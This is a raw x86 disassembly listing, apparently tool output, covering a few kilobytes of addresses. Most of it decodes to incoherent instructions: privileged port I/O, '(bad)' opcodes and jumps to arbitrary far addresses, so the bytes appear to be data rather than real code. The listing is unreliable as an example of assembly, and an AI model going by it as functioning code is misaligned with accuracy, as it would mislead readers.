  42a778:	out    dx,eax
  42a779:	mov    al,ds:0x918296cb
  42a77e:	loop   0x42a7eb
  42a780:	and    BYTE PTR es:[edi+0x65],0x1c
  42a785:	das    
  42a786:	cmp    esp,DWORD PTR [edi+0x23a96ff5]
  42a78c:	xchg   esp,eax
  42a78d:	hlt    
  42a78e:	call   0xe31:0xa7837fe6
  42a795:	sbb    ecx,DWORD PTR [edx]
  42a797:	add    bl,ch
  42a799:	outs   dx,DWORD PTR ds:[esi]
  42a79a:	ror    DWORD PTR es:0xeb40c19d,cl
  42a7a1:	ret    0xb1c0
  42a7a4:	xor    DWORD PTR [ecx-0x2d],ebx
  42a7a7:	mov    dh,0xae
  42a7a9:	jnp    0x42a77d
  42a7ab:	cwde   
  42a7ac:	push   ss
  42a7ad:	mov    esi,edx
  42a7af:	inc    esi
  42a7b0:	jecxz  0x42a754
  42a7b2:	inc    bx
  42a7b4:	push   edi
  42a7b5:	iret   
  42a7b6:	out    0x48,eax
  42a7b8:	cwde   
  42a7b9:	sub    al,dl
  42a7bb:	and    al,0x61
  42a7bd:	dec    ecx
  42a7be:	dec    esi
  42a7bf:	cmp    esp,esp
  42a7c1:	leave  
  42a7c2:	aam    0x41
  42a7c4:	jae    0x42a820
  42a7c6:	mov    al,0xbd
  42a7c8:	in     eax,0xda
  42a7ca:	out    0xf4,al
  42a7cc:	mov    ds:0x8f8282ad,eax
  42a7d1:	mov    ebx,0xb04e852b
  42a7d6:	or     eax,0x79117eb7
  42a7db:	(bad)  
  42a7dc:	das    
  42a7dd:	mov    DWORD PTR [eax-0x11],ecx
  42a7e0:	sub    dl,dl
  42a7e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7e3:	sbb    edi,esi
  42a7e5:	sub    DWORD PTR [esi+0x38],eax
  42a7e8:	call   0xe31547e4
  42a7ed:	adc    dh,BYTE PTR [edx+edi*4]
  42a7f0:	jecxz  0x42a7cc
  42a7f2:	inc    ebp
  42a7f3:	mov    dl,0x4e
  42a7f5:	xor    DWORD PTR [eax+0x47],edi
  42a7f8:	iret   
  42a7f9:	mov    ds:0xacb2649a,eax
  42a7fe:	dec    ecx
  42a7ff:	std    
  42a800:	fwait
  42a801:	ret    
  42a802:	loope  0x42a835
  42a804:	rcl    BYTE PTR ss:[ebx-0x74],0x67
  42a809:	add    bh,BYTE PTR [ecx]
  42a80b:	mov    eax,0xfbc9b504
  42a810:	push   eax
  42a811:	hlt    
  42a812:	or     ebx,DWORD PTR [eax+0x51]
  42a815:	mov    DWORD PTR [edx+eiz*2-0xa],edx
  42a819:	fisub  WORD PTR [ebp+0x3bb539d5]
  42a81f:	jo     0x42a892
  42a821:	test   ecx,esp
  42a823:	pop    eax
  42a824:	je     0x42a81c
  42a826:	xor    ebx,DWORD PTR [eax]
  42a828:	pop    ebp
  42a829:	jmp    0x83832d56
  42a82e:	xchg   edx,eax
  42a82f:	xor    dl,ah
  42a831:	in     al,dx
  42a832:	hlt    
  42a833:	les    esi,FWORD PTR [eax-0x1848b833]
  42a839:	cmp    al,0x11
  42a83b:	mov    cl,0xb7
  42a83d:	mov    esp,0xfefc4f
	...
  42a8b2:	add    BYTE PTR [eax],al
  42a8b4:	push   edi
  42a8b5:	push   0xdf7fdf64
  42a8ba:	(bad)  
  42a8bb:	call   0x123b0c10
  42a8c0:	xchg   edi,eax
  42a8c1:	hlt    
  42a8c2:	push   ebx
  42a8c3:	stos   DWORD PTR es:[edi],eax
  42a8c4:	lahf   
  42a8c5:	ret    0x1
  42a8c8:	cmc    
  42a8c9:	add    BYTE PTR [eax],al
  42a8cb:	add    cl,cl
  42a8cd:	dec    ebx
  42a8ce:	sub    eax,ebp
  42a8d0:	sbb    DWORD PTR ds:0x49e5ebb1,ebx
  42a8d6:	sar    edi,0x38
  42a8d9:	dec    ebx
  42a8da:	sub    esp,edx
  42a8dc:	sti    
  42a8dd:	or     ah,BYTE PTR [eax-0x5]
  42a8e0:	sub    DWORD PTR [ecx-0x19],ebp
  42a8e3:	push   eax
  42a8e4:	xor    ebp,DWORD PTR [ebx-0x69]
  42a8e7:	push   0xb590a1cb
  42a8ec:	sbb    ecx,DWORD PTR [esp+ebp*8-0x21bede1d]
  42a8f3:	into   
  42a8f4:	xchg   ecx,eax
  42a8f5:	dec    edx
  42a8f6:	loop   0x42a952
  42a8f8:	call   FWORD PTR [ebx-0x19]
  42a8fb:	addr16 (bad) 
  42a8fd:	scas   al,BYTE PTR es:[edi]
  42a8fe:	fs xchg edx,eax
  42a900:	fdiv   DWORD PTR [edi-0x4f5b8384]
  42a906:	clc    
  42a907:	cmp    edi,DWORD PTR ds:0xe5740fcc
  42a90d:	popf   
  42a90e:	ror    DWORD PTR [edx-0x3b],1
  42a911:	inc    eax
  42a912:	out    dx,al
  42a913:	xchg   edx,eax
  42a914:	in     eax,dx
  42a915:	pop    es
  42a916:	in     al,dx
  42a917:	aad    0x99
  42a919:	pop    edi
  42a91a:	daa    
  42a91b:	add    ch,BYTE PTR [ebp+0x19]
  42a91e:	sbb    eax,0x33caa5ea
  42a923:	fs and eax,0xbb2e336a
  42a929:	arpl   WORD PTR [ebx+0x8bd1bcc],cx
  42a92f:	push   edx
  42a930:	push   esp
  42a931:	repnz lods al,BYTE PTR ds:[esi]
  42a933:	out    0x8,eax
  42a935:	pop    ebp
  42a936:	rol    dh,1
  42a938:	cld    
  42a939:	stc    
  42a93a:	and    DWORD PTR [ecx-0x4a0016b0],ecx
  42a940:	stos   BYTE PTR es:[edi],al
  42a941:	cmp    al,0x9a
  42a943:	inc    ecx
  42a944:	cli    
  42a945:	js     0x42a994
  42a947:	aaa    
  42a948:	or     ebp,DWORD PTR [ecx-0x5f063ae9]
  42a94e:	(bad)  
  42a94f:	ror    ah,1
  42a951:	jae    0x42a907
  42a953:	jno    0x42a9a6
  42a955:	jo     0x42a91e
  42a957:	nop
  42a958:	push   esi
  42a959:	fsub   st(5),st
  42a95b:	cmp    ecx,DWORD PTR [ebp+0x56633c49]
  42a961:	cmp    dl,BYTE PTR [ebp-0x7b]
  42a964:	mov    ebx,es
  42a966:	jne    0x42a974
  42a968:	jns    0x42a9a5
  42a96a:	pop    edi
  42a96b:	ffreep st(1)
  42a96d:	pop    edx
  42a96e:	adc    DWORD PTR [ebp-0x3],esi
  42a971:	push   ss
  42a972:	xor    BYTE PTR [edx],dh
  42a974:	jge    0x42a911
  42a976:	mov    bl,BYTE PTR [ebx]
  42a978:	rcl    cl,0x5d
  42a97b:	rcl    BYTE PTR [edi+0xd],0x8b
  42a97f:	jbe    0x42a933
  42a981:	xchg   esi,eax
  42a982:	pop    esp
  42a983:	xchg   ebp,eax
  42a984:	(bad)  
  42a986:	call   FWORD PTR [edx]
  42a988:	xchg   edx,eax
  42a989:	inc    ecx
  42a98a:	ins    BYTE PTR es:[edi],dx
  42a98b:	loopne 0x42a9d8
  42a98d:	lock sbb BYTE PTR [edi+edi*8-0x363d56a6],dl
  42a995:	mov    ecx,0xd1287534
  42a99a:	adc    eax,0xfbb16d6d
  42a99f:	imul   ecx,DWORD PTR [ebx*2+0x186bac9a],0x6d
  42a9a7:	test   eax,0xc630ab2c
  42a9ac:	test   eax,0xeb7b636c
  42a9b1:	push   esi
  42a9b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a9b3:	inc    edi
  42a9b4:	or     eax,0x2ac02db5
  42a9b9:	jle    0x42aa0d
  42a9bb:	cs or  eax,0x2d2686ef
	...
  42aa31:	add    BYTE PTR [eax],al
  42aa33:	add    dh,cl
  42aa35:	std    
  42aa36:	sti    
  42aa37:	leave  
  42aa38:	sti    
  42aa39:	iret   
  42aa3a:	(bad)  
  42aa3b:	(bad)  
  42aa3c:	jmp    FWORD PTR [edi+ebx*1-0x1c]
  42aa40:	mov    esp,0x945f01fa
  42aa45:	ret    
  42aa46:	add    DWORD PTR [eax],eax
  42aa48:	cmc    
  42aa49:	add    BYTE PTR [eax],al
  42aa4b:	add    BYTE PTR [ebx-0x6b9c6552],al
  42aa51:	test   al,0xc8
  42aa53:	push   es
  42aa54:	sbb    eax,0xb4afcbd3
  42aa59:	xor    eax,0x51af9858
  42aa5e:	sbb    al,0x8
  42aa60:	mul    edx
  42aa62:	scas   eax,DWORD PTR es:[edi]
  42aa63:	bound  ecx,QWORD PTR [ebp-0x67]
  42aa66:	sbb    eax,0x471b6f30
  42aa6b:	mov    ch,0x25
  42aa6d:	in     al,dx
  42aa6e:	retf   0x9d4b
  42aa71:	mov    ch,0xe3
  42aa73:	jl     0x42aa94
  42aa75:	pushf  
  42aa76:	sti    
  42aa77:	fcmovne st,st(6)
  42aa79:	jge    0x42aae0
  42aa7b:	cmp    DWORD PTR [esi+0x32413e5d],ecx
  42aa81:	inc    ebp
  42aa82:	cmp    eax,0xd8dd675
  42aa87:	ret    0x6ad3
  42aa8a:	aam    0x5a
  42aa8c:	ja     0x42aa0f
  42aa8e:	push   edx
  42aa8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa90:	adc    al,0x47
  42aa92:	xchg   DWORD PTR [edi],edx
  42aa94:	test   al,0xdf
  42aa96:	sub    eax,0xddd4511f
  42aa9b:	fnstenv [esi]
  42aa9d:	inc    eax
  42aa9e:	pop    esi
  42aa9f:	mov    ch,0xb
  42aaa1:	xor    BYTE PTR [esi],ah
  42aaa3:	repnz mov ds:0x7147139b,eax
  42aaa9:	test   BYTE PTR [ebx],0x23
  42aaac:	add    esi,DWORD PTR [edi]
  42aaae:	mov    ebx,eax
  42aab0:	mov    ds:0xc8d93608,al
  42aab5:	fimul  DWORD PTR [ebp-0x4881371b]
  42aabb:	jecxz  0x42aaca
  42aabd:	fimul  WORD PTR [edi+0xc01e15b]
  42aac3:	mov    bh,0x42
  42aac5:	xor    DWORD PTR [edx+eiz*2-0x1a90f5fc],eax
  42aacc:	fs or  eax,0x6b99162a
  42aad2:	sub    BYTE PTR [bp+di-0x6dba],0x75
  42aad8:	call   0x226b:0xee680cf3
  42aadf:	aaa    
  42aae0:	addr16 jns 0x42aaa4
  42aae3:	aad    0xe6
  42aae5:	sub    esp,eax
  42aae7:	add    DWORD PTR [edx+0x30],ecx
  42aaea:	test   al,0xb8
  42aaed:	inc    eax
  42aaee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aaef:	ins    DWORD PTR es:[edi],dx
  42aaf0:	shr    ch,0x9f
  42aaf3:	pop    ss
  42aaf4:	js     0x42aa7e
  42aaf6:	pop    edi
  42aaf7:	xlat   BYTE PTR ds:[ebx]
  42aaf8:	stos   DWORD PTR es:[edi],eax
  42aaf9:	data16 int3 
  42aafb:	loope  0x42aaf7
  42aafd:	dec    ecx
  42aafe:	jns    0x42ab3e
  42ab00:	out    0xf8,al
  42ab02:	je     0x42aa94
  42ab04:	int    0xb6
  42ab06:	daa    
  42ab07:	cdq    
  42ab08:	outs   dx,BYTE PTR ds:[esi]
  42ab09:	loope  0x42ab1a
  42ab0b:	pop    esi
  42ab0c:	jb     0x42ab0c
  42ab0e:	std    
  42ab0f:	mov    ah,0xbe
  42ab11:	pop    ebp
  42ab12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ab13:	out    dx,al
  42ab14:	sbb    eax,0xe9f99cac
  42ab19:	jns    0x42aaba
  42ab1b:	jae    0x42aabf
  42ab1d:	(bad)  
  42ab1e:	xlat   BYTE PTR ds:[ebx]
  42ab1f:	and    DWORD PTR [ebp+0x519ac13c],ebx
  42ab25:	lods   eax,DWORD PTR ds:[esi]
  42ab26:	pop    ecx
  42ab27:	icebp  
  42ab28:	or     al,0xe
  42ab2a:	inc    edi
  42ab2b:	mov    esi,0xba7b6a73
  42ab30:	pop    eax
  42ab31:	adc    bl,BYTE PTR [eax+0x3e]
  42ab34:	and    BYTE PTR [esi+0x7b],ch
  42ab37:	mov    al,gs:0x478227e0
  42ab3d:	bound  esp,QWORD PTR [ecx+0xe91]
	...
  42abb3:	add    BYTE PTR [ebx-0x487759ea],ah
  42abb9:	mov    eax,0x50433faf
  42abbe:	es inc esp
  42abc0:	jb     0x42ac3e
  42abc2:	cmp    eax,0x1c48929
  42abc7:	add    ch,dh
  42abc9:	add    BYTE PTR [eax],al
  42abcb:	add    BYTE PTR [esi],bl
  42abcd:	call   FWORD PTR [ebx+0x4a]
  42abd0:	or     BYTE PTR [ebp-0x76],0x1f
  42abd4:	push   edi
  42abd5:	jns    0x42abcb
  42abd7:	scas   eax,DWORD PTR es:[edi]
  42abd8:	inc    ecx
  42abd9:	and    al,0x81
  42abdb:	dec    esp
  42abdc:	push   cs
  42abdd:	jns    0x42ab70
  42abdf:	xor    ah,BYTE PTR [ecx]
  42abe1:	sbb    ch,bh
  42abe3:	loopne 0x42abef
  42abe5:	inc    eax
  42abe6:	push   eax
  42abe7:	inc    edx
  42abe8:	cs loop 0x42ac2f
  42abeb:	cmp    al,0xac
  42abed:	dec    esp
  42abee:	inc    esp
  42abef:	das    
  42abf0:	sub    ebx,ecx
  42abf2:	lahf   
  42abf3:	inc    edx
  42abf4:	ss test ecx,eax
  42abf7:	ins    DWORD PTR es:[edi],dx
  42abf8:	mov    edx,0xbabad03f
  42abfd:	(bad)  
  42abfe:	(bad)  
  42abff:	pop    edx
  42ac00:	sbb    ebx,DWORD PTR [esi+0x13]
  42ac03:	xchg   esp,eax
  42ac04:	cs enter 0x7f14,0xd4
  42ac09:	int    0xd3
  42ac0b:	stc    
  42ac0c:	pop    eax
  42ac0d:	ror    BYTE PTR [eax],cl
  42ac0f:	xor    ebx,DWORD PTR ds:0xfc052232
  42ac15:	xor    al,BYTE PTR [esi-0x3b]
  42ac18:	inc    ebx
  42ac19:	repz add DWORD PTR [edi],ecx
  42ac1c:	dec    ecx
  42ac1d:	mov    DWORD PTR [ebp+0x49905089],edi
  42ac23:	(bad)  
  42ac24:	adc    eax,0x550b91dc
  42ac29:	(bad)  
  42ac2a:	repz enter 0xfceb,0x88
  42ac2f:	mov    edx,0xb701a6a3
  42ac34:	loopne 0x42ac49
  42ac36:	mov    dl,ah
  42ac38:	sub    bh,BYTE PTR [edi+0x5912242d]
  42ac3e:	lea    ebp,[esi-0xd]
  42ac41:	adc    eax,0x8d3ce9fc
  42ac46:	aad    0xf0
  42ac48:	xchg   DWORD PTR [ecx],edi
  42ac4a:	mov    edi,0xdc047bd1
  42ac4f:	call   0xd107160a
  42ac54:	ss pop ebp
  42ac56:	sahf   
  42ac57:	push   ebx
  42ac58:	fnstsw WORD PTR [ebp+0x55]
  42ac5b:	xor    eax,0x6efc400f
  42ac60:	or     DWORD PTR [edx-0xc],ecx
  42ac63:	in     eax,0x4a
  42ac65:	xchg   edx,eax
  42ac66:	ret    0x72a0
  42ac69:	(bad)  
  42ac6a:	xor    dl,BYTE PTR [edx+0x54fe7c8]
  42ac70:	mov    edi,0xea4834eb
  42ac75:	cmp    esi,DWORD PTR [ebx+0x9]
  42ac78:	or     DWORD PTR [edx+0x25fd0621],edx
  42ac7e:	sbb    eax,0xd06c42cd
  42ac83:	or     dh,dl
  42ac85:	outs   dx,DWORD PTR ds:[esi]
  42ac86:	jmp    0xe3997b1a
  42ac8b:	adc    ebp,edi
  42ac8d:	das    
  42ac8e:	adc    eax,0x229ce624
  42ac93:	lods   al,BYTE PTR ds:[esi]
  42ac94:	jl     0x42acc6
  42ac96:	lods   eax,DWORD PTR ds:[esi]
  42ac97:	jg     0x42acdf
  42ac99:	call   0xd811f3c5
  42ac9e:	mov    BYTE PTR [ebp-0x4f],bl
  42aca1:	call   0x43fbc63c
  42aca6:	mov    ebx,0x3dfa9fe8
  42acab:	push   0x6d021544
  42acb0:	int3   
  42acb1:	jae    0x42ad25
  42acb3:	js     0x42ad28
  42acb5:	nop
  42acb6:	push   0xffffffe3
  42acb8:	loope  0x42ad22
  42acba:	push   edi
  42acbb:	jno    0x42acca
  42acbd:	in     al,dx
  42acbe:	xor    al,0x46
  42acc0:	les    eax,FWORD PTR [eax]
	...
  42ad32:	add    BYTE PTR [eax],al
  42ad34:	fwait
  42ad35:	mov    bh,0xc4
  42ad37:	or     al,0xec
  42ad39:	jg     0x42ad16
  42ad3b:	mov    bh,0xb7
  42ad3d:	sub    DWORD PTR [eax],ebx
  42ad3f:	jp     0x7edf12d7
  42ad45:	lds    eax,FWORD PTR [ecx]
  42ad47:	add    ch,dh
  42ad49:	add    BYTE PTR [eax],al
  42ad4b:	add    ch,ah
  42ad4d:	lods   eax,DWORD PTR ds:[esi]
  42ad4e:	clc    
  42ad4f:	or     eax,DWORD PTR [ecx+0x39eaea5b]
  42ad55:	inc    esi
  42ad56:	jbe    0x42ad06
  42ad58:	cld    
  42ad59:	pop    edi
  42ad5a:	sar    DWORD PTR [edx],cl
  42ad5c:	inc    eax
  42ad5d:	pushf  
  42ad5e:	mov    ah,0xa0
  42ad60:	fs pop eax
  42ad62:	ins    BYTE PTR es:[edi],dx
  42ad63:	retf   0x8b45
  42ad66:	call   FWORD PTR [ecx]
  42ad68:	lock pop ecx
  42ad6a:	or     DWORD PTR [ecx],ebp
  42ad6c:	cli    
  42ad6d:	adc    BYTE PTR [eax+esi*2],al
  42ad70:	test   eax,0x25786a0e
  42ad75:	inc    ebx
  42ad76:	(bad)  
  42ad77:	icebp  
  42ad78:	fld    DWORD PTR [edx-0x42086dbc]
  42ad7e:	pop    edx
  42ad7f:	push   ds
  42ad80:	retf   
  42ad81:	popa   
  42ad82:	xchg   dh,bh
  42ad84:	dec    ebx
  42ad85:	adc    DWORD PTR [esi+0x7a],ecx
  42ad88:	aad    0xe1
  42ad8a:	ja     0x42ad75
  42ad8c:	cpuid  
  42ad8e:	mov    ebx,0xf885a26f
  42ad93:	jmp    ebx
  42ad95:	test   eax,0x82456cd5
  42ad9a:	js     0x42ad50
  42ad9c:	inc    edi
  42ad9d:	test   BYTE PTR [ebx-0x52511f0b],dh
  42ada3:	(bad)  
  42ada5:	jo     0x42ad6e
  42ada7:	imul   esi,DWORD PTR [edi],0x1
  42adaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42adab:	xor    BYTE PTR [edx],ch
  42adad:	add    al,0x3
  42adaf:	jo     0x42adcf
  42adb1:	stos   BYTE PTR es:[edi],al
  42adb2:	test   DWORD PTR [edx],ecx
  42adb4:	xchg   ebp,eax
  42adb5:	or     edx,edi
  42adb7:	inc    edi
  42adb8:	lods   eax,DWORD PTR ds:[esi]
  42adb9:	in     eax,0x18
  42adbb:	loopne 0x42adfa
  42adbd:	or     esi,DWORD PTR [esi-0x7]
  42adc0:	jmp    0x8111:0xc529bf8f
  42adc7:	mov    BYTE PTR [eax+ebx*4],bh
  42adca:	push   ebp
  42adcb:	(bad)  
  42adcd:	add    esi,edi
  42adcf:	nop
  42add0:	icebp  
  42add1:	into   
  42add2:	(bad)
  42add6:	mov    al,0x93
  42add8:	add    BYTE PTR [edi+0xa],0xf0
  42addc:	jg     0x42adb0
  42adde:	adc    DWORD PTR [edi],0x731d2dfe
  42ade4:	div    DWORD PTR [ebp+0x52fca164]
  42adea:	popa   
  42adeb:	or     esp,DWORD PTR [edi+0x3df8a97]
  42adf1:	pop    eax
  42adf2:	sbb    DWORD PTR [esi-0x373ef61],esi
  42adf8:	mov    al,0xe5
  42adfa:	pop    edx
  42adfb:	test   ecx,0x2ecb92ba
  42ae01:	mov    WORD PTR [esi-0x4b],ss
  42ae04:	loope  0x42ade0
  42ae06:	loopne 0x42adad
  42ae08:	not    DWORD PTR [edi-0x76f231b1]
  42ae0e:	and    BYTE PTR [edi+0xc93ff0c],bh
  42ae14:	js     0x42adab
  42ae16:	cmc    
  42ae17:	je     0x42ae6a
  42ae19:	popf   
  42ae1a:	(bad)  
  42ae1b:	push   0x36
  42ae1d:	pop    edi
  42ae1e:	dec    eax
  42ae1f:	(bad)  [edi+edi*8-0x835fac1]
  42ae26:	int3   
  42ae27:	jnp    0x42adc3
  42ae29:	add    eax,0x68a6edf2
  42ae2e:	enter  0x36ec,0xff
  42ae32:	inc    esi
  42ae33:	data16 xchg BYTE PTR [ebp+0x79],bh
  42ae37:	push   eax
  42ae38:	test   DWORD PTR [esp+edx*4-0x7cda6d3d],eax
  42ae3f:	retf   
  42ae40:	mov    esp,0x0
	...
  42aeb1:	add    BYTE PTR [eax],al
  42aeb3:	add    BYTE PTR [ecx],dh
  42aeb5:	inc    ebp
  42aeb6:	enter  0xfc06,0x8f
  42aeba:	push   DWORD PTR [edi+0x59]
  42aebd:	out    dx,eax
  42aebe:	adc    dl,al
  42aec0:	and    al,BYTE PTR ds:0xc673890f
  42aec6:	add    DWORD PTR [eax],eax
  42aec8:	cmc    
  42aec9:	add    BYTE PTR [eax],al
  42aecb:	add    BYTE PTR [ecx-0x4a],dh
  42aece:	imul   ebx,DWORD PTR [ebx-0x38878c4a],0x591f0a23
  42aed8:	sar    BYTE PTR [ebx],1
  42aeda:	leave  
  42aedb:	scas   al,BYTE PTR es:[edi]
  42aedc:	sub    al,0xa6
  42aede:	cld    
  42aedf:	and    esi,edx
  42aee1:	push   es
  42aee2:	mov    ds:0xe9b76e97,al
  42aee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aee8:	mov    ebp,0x57aa17e5
  42aeed:	and    eax,DWORD PTR [eax]
  42aeef:	push   ds
  42aef0:	repz xchg esi,eax
  42aef2:	les    edi,FWORD PTR [edi]
  42aef4:	xor    al,0x1f
  42aef6:	dec    ebp
  42aef7:	add    eax,0xe912ca4
  42aefc:	pop    ecx
  42aefd:	inc    edx
  42aefe:	mov    esp,DWORD PTR ds:0x16d205a1
  42af04:	push   ebx
  42af05:	sub    ebx,DWORD PTR [ebp+edi*1-0x3680abc2]
  42af0c:	out    dx,al
  42af0d:	hlt    
  42af0e:	pop    edx
  42af0f:	rcl    BYTE PTR [ecx],cl
  42af11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af12:	and    DWORD PTR [ebx-0x93ccda5],0x47a0aae9
  42af1c:	shl    DWORD PTR [ecx+0x5a292656],1
  42af22:	push   ds
  42af23:	fwait
  42af24:	adc    edx,DWORD PTR [edx+0x60]
  42af27:	ror    DWORD PTR [ebp-0x215ec3cc],1
  42af2d:	gs xchg esp,eax
  42af2f:	scas   eax,DWORD PTR es:[edi]
  42af30:	push   ss
  42af31:	ds mov eax,0x231f99a3
  42af37:	pop    ebx
  42af38:	jmp    0xe8f89f32
  42af3d:	sub    esp,DWORD PTR [esi]
  42af3f:	add    eax,0xca37ca
  42af44:	das    
  42af45:	fwait
  42af46:	lahf   
  42af47:	sbb    DWORD PTR [eax+0x65f82fae],esi
  42af4d:	shl    BYTE PTR [ecx+0x29],1
  42af50:	fcom   DWORD PTR [ebx+0x3d959ac5]
  42af56:	cmp    cl,BYTE PTR [ebp+edi*4-0x2f25ead4]
  42af5d:	xchg   esp,eax
  42af5e:	adc    eax,0xfe1c95c3
  42af63:	push   0x47
  42af65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af66:	out    0x10,eax
  42af68:	jg     0x42af49
  42af6a:	int3   
  42af6b:	push   ebp
  42af6c:	dec    edx
  42af6d:	aad    0x9b
  42af6f:	ja     0x42af6c
  42af71:	add    ecx,DWORD PTR [esi-0x171de4ab]
  42af77:	mov    cl,0x82
  42af79:	dec    eax
  42af7a:	loop   0x42af19
  42af7c:	pop    eax
  42af7d:	test   BYTE PTR [edi],bl
  42af7f:	push   ebx
  42af80:	mov    ds:0xcc4feaf8,eax
  42af85:	push   cs
  42af86:	add    al,al
  42af88:	imul   edi,DWORD PTR [ecx],0xe4990449
  42af8e:	mov    ebp,0x6424a103
  42af93:	fs retf 0xf4ad
  42af97:	sbb    al,0x5a
  42af99:	ja     0x42afc0
  42af9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af9c:	(bad)  
  42af9d:	pop    edx
  42af9e:	mov    ds:0x9633811c,al
  42afa3:	inc    eax
  42afa4:	sbb    eax,ecx
  42afa6:	xor    al,0xe6
  42afa8:	sub    BYTE PTR [ecx+0x76],ah
  42afab:	test   ah,0x39
  42afae:	mov    al,0xcf
  42afb0:	mov    DWORD PTR [eax+0x12],esp
  42afb3:	(bad)  
  42afb4:	fild   QWORD PTR [ecx]
  42afb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42afb7:	jle    0x42af5b
  42afb9:	dec    eax
  42afba:	sbb    al,0xe9
  42afbc:	sub    al,0x2
  42afbe:	jmp    0x432084
	...
  42b033:	add    bh,dl
  42b035:	pushf  
  42b036:	shr    BYTE PTR [ebp-0x1000235],0x4c
  42b03d:	jb     0x42b001
  42b03f:	ret    0x515b
  42b042:	addr16 or eax,0x1c768
  42b048:	cmc    
  42b049:	add    BYTE PTR [eax],al
  42b04b:	add    BYTE PTR [ecx-0x2d],bl
  42b04e:	loopne 0x42b06b
  42b050:	retf   0xd218
  42b053:	imul   ebp,DWORD PTR [ebx+ebx*4-0x296ccc5b],0xffffffc4
  42b05b:	inc    esi
  42b05c:	shl    edx,0xe2
  42b05f:	jne    0x42b0ab
  42b061:	xchg   ebx,eax
  42b062:	rep lods eax,DWORD PTR ds:[esi]
  42b064:	dec    ebx
  42b065:	jns    0x42b00b
  42b067:	ret    0x23b8
  42b06a:	loop   0x42b077
  42b06c:	mov    eax,0x7e208bd8
  42b071:	xchg   DWORD PTR [edi*2+0x4d8aa94b],ebp
  42b078:	lock jmp 0x845fc447
  42b07e:	add    ecx,ebp
  42b080:	and    edx,DWORD PTR [ebx]
  42b082:	or     eax,0xaad8276c
  42b087:	popf   
  42b088:	imul   edx,DWORD PTR [ebp-0x4c],0x38
  42b08c:	jge    0x42b0a3
  42b08e:	pusha  
  42b08f:	test   eax,0x4ee87811
  42b094:	cdq    
  42b095:	push   cs
  42b096:	or     esi,DWORD PTR [esi+eax*8]
  42b099:	xor    al,0x2
  42b09b:	add    esi,edi
  42b09d:	inc    edx
  42b09e:	push   0x6c
  42b0a0:	adc    DWORD PTR [edx],esp
  42b0a2:	mov    ds:0x67c64703,eax
  42b0a7:	out    dx,al
  42b0a8:	stos   BYTE PTR es:[edi],al
  42b0a9:	cwde   
  42b0aa:	fistp  QWORD PTR [edi]
  42b0ac:	and    eax,0xcdff980e
  42b0b1:	inc    edi
  42b0b2:	int    0xb2
  42b0b4:	iret   
  42b0b5:	or     edi,DWORD PTR [ebp+0x54]
  42b0b8:	pop    ecx
  42b0b9:	sbb    cl,BYTE PTR [edi+0x24ec964e]
  42b0bf:	add    al,0xe
  42b0c1:	jg     0x42b13e
  42b0c3:	jg     0x42b095
  42b0c5:	sub    al,0xe3
  42b0c7:	stos   BYTE PTR es:[edi],al
  42b0c8:	xchg   ebx,eax
  42b0c9:	test   eax,0x6c949a05
  42b0ce:	out    dx,eax
  42b0cf:	iret   
  42b0d0:	xor    edx,DWORD PTR [edx]
  42b0d2:	mov    ebx,0xaf744867
  42b0d7:	or     esi,DWORD PTR [edi-0x1d]
  42b0da:	outs   dx,BYTE PTR ds:[esi]
  42b0db:	mov    ecx,0xc296a61e
  42b0e0:	sar    DWORD PTR [edx+0x55044812],1
  42b0e6:	adc    eax,0xad1a663c
  42b0eb:	push   0xffffffd0
  42b0ed:	stos   BYTE PTR es:[edi],al
  42b0ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0ef:	jnp    0x42b0a7
  42b0f1:	push   0x35e80b0e
  42b0f6:	dec    eax
  42b0f7:	and    edi,DWORD PTR [edx]
  42b0f9:	adc    BYTE PTR [ecx+ebx*8+0x42ce2b59],cl
  42b100:	je     0x42b150
  42b102:	push   ds
  42b103:	jmp    0xaf83:0xe8492039
  42b10a:	add    al,0x20
  42b10c:	dec    esi
  42b10d:	pop    ss
  42b10e:	pop    edi
  42b10f:	jge    0x42b164
  42b111:	xchg   esi,eax
  42b112:	nop
  42b113:	icebp  
  42b114:	mov    ds:0xd27fbfd4,al
  42b119:	xchg   esi,ebp
  42b11b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b11c:	leave  
  42b11d:	fldln2 
  42b11f:	popf   
  42b120:	push   cs
  42b121:	mov    BYTE PTR [ebx+0x19091180],bl
  42b127:	mov    ebp,0xb1cbedde
  42b12c:	inc    edi
  42b12d:	lods   eax,DWORD PTR ds:[esi]
  42b12e:	and    DWORD PTR ds:0x3f715226,edi
  42b134:	into   
  42b135:	aas    
  42b136:	mov    al,dh
  42b138:	jno    0x42b0e6
  42b13a:	fwait
  42b13b:	iret   
  42b13c:	and    eax,0xebfebc67
	...
  42b1b1:	add    BYTE PTR [eax],al
  42b1b3:	add    BYTE PTR [ebx],ch
  42b1b5:	test   DWORD PTR [ebp-0x50e640e7],edx
  42b1bb:	mov    bh,0x27
  42b1bd:	xchg   ecx,eax
  42b1be:	push   esp
  42b1bf:	outs   dx,DWORD PTR ds:[esi]
  42b1c0:	jecxz  0x42b188
  42b1c2:	loope  0x42b199
  42b1c4:	pop    ebp
  42b1c5:	enter  0x1,0xf5
  42b1c9:	add    BYTE PTR [eax],al
  42b1cb:	add    BYTE PTR [edx],al
  42b1cd:	jge    0x42b213
  42b1cf:	mov    ah,0xc
  42b1d1:	fisttp WORD PTR [edi-0x20]
  42b1d4:	iret   
  42b1d5:	jnp    0x42b196
  42b1d7:	pop    edx
  42b1d8:	xor    ebx,DWORD PTR [ebp-0x60]
  42b1db:	push   eax
  42b1dc:	or     DWORD PTR [edi+0x7f],ebx
  42b1df:	mov    eax,0x3ecf22c3
  42b1e4:	mov    esi,0xcec98ba4
  42b1e9:	dec    ecx
  42b1ea:	dec    esi
  42b1eb:	cmp    BYTE PTR [esi],bl
  42b1ed:	std    
  42b1ee:	repnz add eax,edi
